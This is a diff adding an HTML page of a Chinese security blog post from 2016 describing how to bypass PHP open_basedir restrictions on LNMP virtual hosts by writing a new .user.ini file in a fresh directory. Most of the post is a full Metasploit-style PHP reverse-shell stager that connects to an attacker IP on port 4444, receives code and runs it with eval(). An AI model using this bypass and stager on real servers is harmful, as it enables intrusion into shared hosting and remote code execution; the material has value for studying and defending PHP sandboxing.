@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <link rel="shortcut icon" href="../../../public/1616.ico">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>LNMP虚拟主机PHP沙盒逃逸 - Posted By Tr3jer</title>
+    <meta name="description" content="Hacking for fun. - Tr3jer_CongRong"/>
+    <link rel="stylesheet" href="/css/Tr3jer.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <div class="site">
+      <div class="post-content">
+        <div id="post">
+          <h1 id="lnmpphp">LNMP虚拟主机PHP沙盒逃逸</h1>
+<p class="date">13 Jul 2016 - Tr3jer_CongRong</p>
+
+<p>      并不只是针对Lnmp的沙盒逃逸，而是.user.ini的设计缺陷达到绕过open_basedir限制，所以是通用的方法。首先来看看最新版LNMP是怎么配置open_basedir的：</p>
+
+<pre><code>open_basedir=/home/wwwroot/default:/tmp/:/proc/
+
+lsattr .user.ini
+----i----------- .user.ini
+</code></pre>
+
+<p>      LNMP的open_basedir是通过.user.ini来配置的。再来看disable_functions都禁用了哪些函数：</p>
+
+<pre><code>lnmp1.3/include/php.sh
+</code></pre>
+
+<p><img src="http://7xiw31.com1.z0.glb.clouddn.com/5ethrdfb.png" /></p>
+
+<p>      注意到了stream_socket_server被禁用了。这个是用来建立Socket服务端的，完全可以使用其他可创建socket服务端的函数进行反弹个socket会话，比如socket_create、 fsockopen。不过虽是可以建立socket会话，但group为www，所以这个留在后面结合使用。</p>
+
+<p>      .user.ini是不允许增删改的，那怎样能突破限制？.user.ini只在当前目录生效了。那么我们可不可以写入新的.user.ini并且不与原.user.ini冲突，将其open_basedir指向根目录？可以的。</p>
+
+<p>      首先创建一个目录并写入新的.user.ini。新的.user.ini需要1-3min来生效。</p>
+
+<pre><code>open_basedir=/
+</code></pre>
+
+<p>      最后结合socket，使用msf在新目录生成个反向代理payload并稍加更改就可以了。</p>
+
+<pre><code>&lt;?php
+error_reporting(0);
+
+$ip = '192.168.137.67';
+$port = 4444;
+$ipf = AF_INET;
+if (FALSE !== strpos($ip, ":")) {
+	$ip = "[". $ip ."]";
+	$ipf = AF_INET6;
+}
+if (($f = 'fsockopen') &amp;&amp; is_callable($f)) {
+	$s = $f($ip, $port);
+	$s_type = 'stream';
+} elseif (($f = 'socket_create') &amp;&amp; is_callable($f)) {
+	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
+	$res = @socket_connect($s, $ip, $port);
+	if (!$res) {
+		die(); 
+	}
+	$s_type = 'socket';
+} else {
+	die('no socket funcs');
+}
+if (!$s) {
+	die('no socket');
+}
+
+switch ($s_type) {
+	case 'stream': $len = fread($s, 4); break;
+	case 'socket': $len = socket_read($s, 4); break;
+}
+
+if (!$len) {
+	die();
+}
+
+$a = unpack("Nlen", $len); $len = $a['len'];
+$b = '';
+while (strlen($b) &lt; $len) {
+	switch ($s_type) {
+		case 'stream': $b .= fread($s, $len-strlen($b)); break;
+		case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
+	}
+}
+$GLOBALS['msgsock'] = $s;
+$GLOBALS['msgsock_type'] = $s_type;
+eval($b);
+die();
+?&gt;
+</code></pre>
+
+<p><img src="http://7xiw31.com1.z0.glb.clouddn.com/rsd.png" /></p>
+
+        </div>
+      </div>
+      
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+      /* * * CONFIGURATION VARIABLES * * */
+      var disqus_shortname = 'tr3jer';
+      
+      /* * * DON'T EDIT BELOW THIS LINE * * */
+      (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+      <div id="disqus_thread"></div>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://weibo.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="https://twitter.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Twitter</a> |&nbsp;
+            <a href="/link" target="_blank" style="text-decoration: none; margin-right: 5px;">Links</a> |&nbsp;
+            <a href="/mail.txt" target="_blank">Gmail</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="http://s11.cnzz.com/z_stat.php?id=1256907244&web_id=1256907244" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
